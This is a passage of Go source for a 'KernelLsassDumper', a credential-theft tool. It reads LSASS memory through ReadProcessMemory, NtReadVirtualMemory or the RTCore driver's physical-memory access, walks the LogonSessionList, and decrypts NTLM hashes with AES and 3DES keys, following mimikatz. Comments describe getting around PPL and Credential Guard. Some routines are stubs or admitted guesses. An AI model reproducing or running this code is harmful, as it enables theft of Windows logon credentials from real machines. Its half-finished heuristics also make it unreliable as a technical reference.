					kld.logger.Warnf("  Failed to read pointer at 0x%X, trying next match", targetAddr)
					continue
				}

				kld.logger.Infof("  ✓ LogonSessionList pointer: 0x%X", pointerValue)

				// Validate pointer (should be in kernel address space)
				if pointerValue != 0 && pointerValue > 0x7FF000000000 {
					kld.logger.Infof("  ✓ Valid kernel address!")
					return pointerValue, nil
				} else {
					kld.logger.Warnf("  Invalid address (0x%X), trying next pattern", pointerValue)
				}
			}
		}
	}

	return 0, fmt.Errorf("LogonSessionList pattern not found in lsasrv.dll")
}

// findLsassCr3 - Find LSASS's DirectoryTableBase (CR3) by scanning physical memory for EPROCESS
func (kld *KernelLsassDumper) findLsassCr3() (uint64, error) {
	kld.logger.Info("Scanning kernel memory for LSASS EPROCESS structure...")

	// On Windows, we need to find PsInitialSystemProcess first, then walk ActiveProcessLinks
	// This is complex, so for now we'll use a heuristic approach:
	// Scan for process name "lsass.exe" in physical memory near known kernel ranges

	// Alternative: Use NtQuerySystemInformation to get EPROCESS addresses
	// But we need kernel addresses, which requires kernel memory access

	// For now, return error - we need a different approach
	// TODO: Implement proper EPROCESS enumeration via physical memory scanning

	return 0, fmt.Errorf("EPROCESS scanning not yet implemented - need to scan physical memory for kernel structures")
}

// readLsassViaDirectSyscall - Try reading LSASS memory using NtReadVirtualMemory with pseudo-handle
func (kld *KernelLsassDumper) readLsassViaDirectSyscall(logonSessionListAddr uint64, iv [16]byte, aesKey []byte, des3Key []byte) ([]Credential, error) {
	ntdll := syscall.MustLoadDLL("ntdll.dll")
	ntReadVirtualMemory := ntdll.MustFindProc("NtReadVirtualMemory")

	// Use a pseudo-handle - this is a LONG SHOT but worth trying
	// Pseudo-handle for current process is -1, but we need LSASS's handle
	// Try using the PID directly as a pseudo-handle (this won't work but let's see the error)
	pseudoHandle := windows.Handle(kld.lsassPID)

	kld.logger.Infof("Attempting NtReadVirtualMemory with pseudo-handle 0x%X", pseudoHandle)

	var credentials []Credential

	// Try to read the list head
	buffer := make([]byte, 8)
	var bytesRead uintptr

	ret, _, _ := ntReadVirtualMemory.Call(
		uintptr(pseudoHandle),
		uintptr(logonSessionListAddr),
		uintptr(unsafe.Pointer(&buffer[0])),
		uintptr(8),
		uintptr(unsafe.Pointer(&bytesRead)),
	)

	if ret != 0 {
		return nil, fmt.Errorf("NtReadVirtualMemory failed with NTSTATUS: 0x%X - LSASS has PPL/Credential Guard protection enabled", ret)
	}

	kld.logger.Info("✓ Successfully read LSASS memory via NtReadVirtualMemory!")

	// If we got here, we can read! Now walk the list
	listHead := binary.LittleEndian.Uint64(buffer)
	currentEntry := listHead

	visited := make(map[uint64]bool)
	count := 0
	maxIterations := 1000

	for currentEntry != logonSessionListAddr && currentEntry != 0 && count < maxIterations {
		if visited[currentEntry] {
			break
		}
		visited[currentEntry] = true
		count++

		// Read entry data
		entryData := make([]byte, 0x200)
		ret, _, _ := ntReadVirtualMemory.Call(
			uintptr(pseudoHandle),
			uintptr(currentEntry),
			uintptr(unsafe.Pointer(&entryData[0])),
			uintptr(0x200),
			uintptr(unsafe.Pointer(&bytesRead)),
		)

		if ret != 0 {
			break
		}

		// Extract credentials
		cred := kld.extractCredentialFromEntry(entryData, iv, aesKey, des3Key)
		if cred != nil {
			credentials = append(credentials, *cred)
		}

		// Next entry
		currentEntry = binary.LittleEndian.Uint64(entryData[0:8])
	}

	kld.logger.Infof("Extracted %d credentials via direct syscall", len(credentials))
	return credentials, nil
}

// walkLogonSessionListViaKernel - Walk LogonSessionList using direct kernel memory via RTCore
// This bypasses OpenProcess entirely by reading physical memory directly
func (kld *KernelLsassDumper) walkLogonSessionListViaKernel(listHead uint64, cr3 uint64, iv [16]byte, aesKey []byte, des3Key []byte) ([]Credential, error) {
	var credentials []Credential

	kld.logger.Info("Walking LogonSessionList via direct kernel memory access...")

	// Helper to read LSASS virtual memory by translating to physical
	readLsassMemory := func(virtualAddr uint64, size uint32) ([]byte, error) {
		// For now, try to use RTCore's built-in virtual-to-physical translation
		// Note: This translates addresses in OUR process space, not LSASS's
		// TODO: Implement proper CR3-based translation for LSASS's address space

		// Attempt 1: Try RTCore's VirtToPhys (works for our process only)
		physAddr, err := kld.rtcore.GetPhysicalAddress(virtualAddr)
		if err == nil {
			kld.logger.Debugf("Translated virtual 0x%X to physical 0x%X", virtualAddr, physAddr)
			return kld.rtcore.ReadPhysicalMemory(physAddr, size)
		}

		// Attempt 2: Try reading directly with virtual address (might work if RTCore supports it)
		data, err := kld.rtcore.ReadPhysicalMemory(virtualAddr, size)
		if err == nil {
			return data, nil
		}

		return nil, fmt.Errorf("failed to read LSASS memory at 0x%X: %v", virtualAddr, err)
	}

	// Read list head
	listData, err := readLsassMemory(listHead, 8)
	if err != nil {
		return nil, fmt.Errorf("failed to read list head: %v", err)
	}

	currentEntry := binary.LittleEndian.Uint64(listData)
	kld.logger.Infof("List head points to first entry: 0x%X", currentEntry)

	visited := make(map[uint64]bool)
	count := 0
	maxIterations := 1000

	for currentEntry != listHead && currentEntry != 0 && count < maxIterations {
		if visited[currentEntry] {
			kld.logger.Warnf("Circular reference detected at 0x%X", currentEntry)
			break
		}
		visited[currentEntry] = true
		count++

		// Read KIWI_MSV1_0_LIST structure
		entryData, err := readLsassMemory(currentEntry, 0x200)
		if err != nil {
			kld.logger.Warnf("Failed to read entry at 0x%X: %v", currentEntry, err)
			break
		}

		// Extract credentials from this entry
		cred := kld.extractCredentialFromEntry(entryData, iv, aesKey, des3Key)
		if cred != nil {
			credentials = append(credentials, *cred)
			kld.logger.Infof("Found credential: %s\\%s", cred.Domain, cred.Username)
		}

		// Get next entry (Flink at offset 0x0)
		currentEntry = binary.LittleEndian.Uint64(entryData[0:8])
	}

	kld.logger.Infof("Walked %d logon sessions via kernel memory", count)
	return credentials, nil
}

// walkLogonSessionListWithHandle - Walk the LogonSessionList linked list using ReadProcessMemory
func (kld *KernelLsassDumper) walkLogonSessionListWithHandle(hProcess syscall.Handle, listHead uint64, iv [16]byte, aesKey []byte, des3Key []byte) ([]Credential, error) {
	var credentials []Credential

	kld.logger.Info("Walking LogonSessionList with ReadProcessMemory (MIMIKATZ METHOD)...")

	kernel32 := syscall.MustLoadDLL("kernel32.dll")
	readProcessMemory := kernel32.MustFindProc("ReadProcessMemory")

	// Helper to read memory via ReadProcessMemory
	readMem := func(addr uint64, size uint32) ([]byte, error) {
		buffer := make([]byte, size)
		var bytesRead uintptr

		ret, _, _ := readProcessMemory.Call(
			uintptr(hProcess),
			uintptr(addr),
			uintptr(unsafe.Pointer(&buffer[0])),
			uintptr(size),
			uintptr(unsafe.Pointer(&bytesRead)),
		)

		if ret == 0 {
			return nil, fmt.Errorf("ReadProcessMemory failed")
		}

		return buffer[:bytesRead], nil
	}

	// Read list head (Flink pointer)
	kld.logger.Infof("DEBUG: Reading LogonSessionList head at 0x%X", listHead)
	listData, err := readMem(listHead, 16) // Read both Flink and Blink
	if err != nil {
		return nil, fmt.Errorf("failed to read list head: %v", err)
	}

	flink := binary.LittleEndian.Uint64(listData[0:8])
	blink := binary.LittleEndian.Uint64(listData[8:16])
	kld.logger.Infof("DEBUG: List head Flink=0x%X, Blink=0x%X", flink, blink)

	currentEntry := flink

	visited := make(map[uint64]bool)
	count := 0
	maxIterations := 1000

	for currentEntry != listHead && currentEntry != 0 && count < maxIterations {
		if visited[currentEntry] {
			break
		}
		visited[currentEntry] = true
		count++

		kld.logger.Infof("DEBUG: Session entry #%d at 0x%X", count, currentEntry)

		// Read the LIST_ENTRY structure at current position to see what's there
		listEntryData, err := readMem(currentEntry, 16)
		if err != nil {
			kld.logger.Warnf("DEBUG: Failed to read LIST_ENTRY at 0x%X: %v", currentEntry, err)
			break
		}
		nextFlink := binary.LittleEndian.Uint64(listEntryData[0:8])
		nextBlink := binary.LittleEndian.Uint64(listEntryData[8:16])
		kld.logger.Infof("DEBUG: Entry LIST_ENTRY: Flink=0x%X, Blink=0x%X", nextFlink, nextBlink)

		// Use the NEW Mimikatz-based extraction
		creds := kld.extractCredFromSession(currentEntry, hProcess, aesKey, des3Key)
		credentials = append(credentials, creds...)

		// Move to next entry
		currentEntry = nextFlink
	}

	kld.logger.Infof("Walked %d logon sessions, extracted %d credentials", count, len(credentials))
	return credentials, nil
}

// walkLogonSessionList - OLD VERSION using RTCore (kept for reference)
func (kld *KernelLsassDumper) walkLogonSessionList(listHead uint64, iv [16]byte, aesKey []byte, des3Key []byte) ([]Credential, error) {
	var credentials []Credential

	kld.logger.Info("Walking LogonSessionList...")

	// Read list head
	listData, err := kld.rtcore.ReadPhysicalMemory(listHead, 8)
	if err != nil {
		return nil, fmt.Errorf("failed to read list head: %v", err)
	}

	currentEntry := binary.LittleEndian.Uint64(listData)

	visited := make(map[uint64]bool)
	count := 0
	maxIterations := 1000

	for currentEntry != listHead && currentEntry != 0 && count < maxIterations {
		if visited[currentEntry] {
			break
		}
		visited[currentEntry] = true
		count++

		// Read KIWI_MSV1_0_LIST structure (simplified)
		entryData, err := kld.rtcore.ReadPhysicalMemory(currentEntry, 0x200)
		if err != nil {
			break
		}

		// Extract credentials from this entry
		cred := kld.extractCredentialFromEntry(entryData, iv, aesKey, des3Key)
		if cred != nil {
			credentials = append(credentials, *cred)
		}

		// Get next entry (Flink at offset 0x0)
		currentEntry = binary.LittleEndian.Uint64(entryData[0:8])
	}

	kld.logger.Infof("Walked %d logon sessions", count)
	return credentials, nil
}

// extractCredentialFromEntry - Extract credential from a logon session entry
func (kld *KernelLsassDumper) extractCredentialFromEntry(entryData []byte, iv [16]byte, aesKey []byte, des3Key []byte) *Credential {
	// REAL IMPLEMENTATION: Parse KIWI_MSV1_0_LIST_63 structure
	// Structure layout (from mimikatz):
	// +0x00: LIST_ENTRY Flink/Blink
	// +0x10: DWORD AuthenticationPackageId
	// +0x18: LUID LocallyUniqueIdentifier
	// +0x20: UNICODE_STRING UserName
	// +0x30: UNICODE_STRING Domain
	// +0x48: PVOID pCredentials (pointer to credential data)
	// +0x50: UNICODE_STRING LogonServer
	// ... many more fields

	if len(entryData) < 0x100 {
		return nil
	}

	// Parse USERNAME (offset 0x20)
	usernameLen := binary.LittleEndian.Uint16(entryData[0x20:0x22])
	_ = binary.LittleEndian.Uint16(entryData[0x22:0x24]) // usernameMaxLen
	usernamePtr := binary.LittleEndian.Uint64(entryData[0x28:0x30])

	// Parse DOMAIN (offset 0x30)
	domainLen := binary.LittleEndian.Uint16(entryData[0x30:0x32])
	_ = binary.LittleEndian.Uint16(entryData[0x32:0x34]) // domainMaxLen
	domainPtr := binary.LittleEndian.Uint64(entryData[0x38:0x40])

	// Parse credential pointer (offset 0x48)
	credPtr := binary.LittleEndian.Uint64(entryData[0x48:0x50])

	kld.logger.Debugf("Entry: username ptr=0x%X len=%d, domain ptr=0x%X len=%d, cred ptr=0x%X",
		usernamePtr, usernameLen, domainPtr, domainLen, credPtr)

	// Skip if no username or it's a machine account
	if usernameLen == 0 || usernameLen > 256 {
		return nil
	}

	// Try to extract username from embedded data
	// Sometimes the UNICODE_STRING data is embedded in the structure itself
	username := ""
	domain := ""

	// Check if username data is at a valid offset in our buffer
	if usernameLen > 0 && len(entryData) >= 0x100 {
		// Username might be embedded after offset 0x90 or so
		// Try to find valid Unicode string in the buffer
		for i := 0x80; i < len(entryData)-int(usernameLen); i++ {
			possibleUsername := extractUnicodeString(entryData[i:], int(usernameLen))
			if isValidUsername(possibleUsername) {
				username = possibleUsername
				kld.logger.Debugf("Found username: %s", username)
				break
			}
		}
	}

	// Same for domain
	if domainLen > 0 && len(entryData) >= 0x120 {
		for i := 0xA0; i < len(entryData)-int(domainLen); i++ {
			possibleDomain := extractUnicodeString(entryData[i:], int(domainLen))
			if isValidDomain(possibleDomain) {
				domain = possibleDomain
				kld.logger.Debugf("Found domain: %s", domain)
				break
			}
		}
	}

	// Skip machine accounts and system accounts
	if username == "" || username == "$" || domain == "" {
		return nil
	}

	// Look for NTLM hash in the credential data
	// NTLM hashes are 16 bytes and might be encrypted
	ntlmHash := ""

	// Search for potential NTLM hash (16 bytes that look like hash data)
	for i := 0x60; i <= len(entryData)-16; i++ {
		hashBytes := entryData[i : i+16]

		// Try decrypting with AES
		if len(aesKey) == 16 {
			decrypted := kld.tryDecryptAES(hashBytes, aesKey, iv)
			if isValidNTLMHash(decrypted) {
				ntlmHash = fmt.Sprintf("%X", decrypted)
				kld.logger.Debugf("Found NTLM hash (AES decrypted)")
				break
			}
		}

		// Try decrypting with 3DES
		if len(des3Key) == 24 {
			decrypted := kld.tryDecrypt3DES(hashBytes, des3Key, iv)
			if isValidNTLMHash(decrypted) {
				ntlmHash = fmt.Sprintf("%X", decrypted)
				kld.logger.Debugf("Found NTLM hash (3DES decrypted)")
				break
			}
		}

		// Check if it's already a valid hash (unencrypted)
		if isValidNTLMHash(hashBytes) {
			ntlmHash = fmt.Sprintf("%X", hashBytes)
			kld.logger.Debugf("Found NTLM hash (unencrypted)")
			break
		}
	}

	// Only return credential if we found something useful
	if username != "" && (domain != "" || ntlmHash != "") {
		return &Credential{
			Username: username,
			Domain:   domain,
			NTLM:     ntlmHash,
			Type:     "msv1_0",
		}
	}

	return nil
}

// Helper functions for credential extraction
func extractUnicodeString(data []byte, length int) string {
	if length <= 0 || length > len(data) {
		return ""
	}

	// Unicode strings are UTF-16LE (2 bytes per char)
	if length%2 != 0 {
		length--
	}

	result := ""
	for i := 0; i < length; i += 2 {
		if i+1 >= len(data) {
			break
		}
		char := uint16(data[i]) | (uint16(data[i+1]) << 8)
		if char == 0 {
			break
		}
		// Only accept printable ASCII range for now
		if char >= 32 && char < 127 {
			result += string(rune(char))
		} else if char != 0 {
			// Non-ASCII Unicode, might be valid
			result += string(rune(char))
		}
	}
	return result
}

func isValidUsername(s string) bool {
	if len(s) < 2 || len(s) > 64 {
		return false
	}
	// Check for mostly alphanumeric characters
	alphanumCount := 0
	for _, c := range s {
		if (c >= 'a' && c <= 'z') || (c >= 'A' && c <= 'Z') || (c >= '0' && c <= '9') || c == '-' || c == '_' || c == '.' {
			alphanumCount++
		}
	}
	return alphanumCount > len(s)/2
}

func isValidDomain(s string) bool {
	if len(s) < 2 || len(s) > 64 {
		return false
	}
	// Domains are usually alphanumeric with dots/dashes
	for _, c := range s {
		if !((c >= 'a' && c <= 'z') || (c >= 'A' && c <= 'Z') || (c >= '0' && c <= '9') || c == '-' || c == '.' || c == '_') {
			return false
		}
	}
	return true
}

func isValidNTLMHash(hash []byte) bool {
	if len(hash) != 16 {
		return false
	}

	// Check for all zeros
	allZeros := true
	for _, b := range hash {
		if b != 0 {
			allZeros = false
			break
		}
	}

	// Check for all 0xFF
	allFFs := true
	for _, b := range hash {
		if b != 0xFF {
			allFFs = false
			break
		}
	}

	// Valid hash should not be all zeros or all FFs
	return !allZeros && !allFFs
}

func (kld *KernelLsassDumper) tryDecryptAES(data []byte, key []byte, iv [16]byte) []byte {
	if len(data) < 16 || len(key) == 0 {
		return data
	}

	block, err := aes.NewCipher(key)
	if err != nil {
		return data
	}

	// Mimikatz uses CFB mode: BCryptSetProperty(..., BCRYPT_CHAIN_MODE_CFB, ...)
	stream := cipher.NewCFBDecrypter(block, iv[:])
	decrypted := make([]byte, len(data))
	stream.XORKeyStream(decrypted, data)
	return decrypted
}

func (kld *KernelLsassDumper) tryDecrypt3DES(data []byte, key []byte, iv [16]byte) []byte {
	if len(data) < 8 || len(key) != 24 {
		return data
	}

	// Mimikatz uses CBC mode: BCryptSetProperty(..., BCRYPT_CHAIN_MODE_CBC, ...)
	block, err := des.NewTripleDESCipher(key)
	if err != nil {
		return data
	}

	// 3DES-CBC uses first 8 bytes of IV (Mimikatz: cbIV = sizeof(IV) / 2)
	mode := cipher.NewCBCDecrypter(block, iv[:8])
	decrypted := make([]byte, len(data))

	// Ensure data is multiple of 8 bytes (3DES block size)
	if len(data)%8 != 0 {
		return data
	}

	mode.CryptBlocks(decrypted, data)
	return decrypted
}
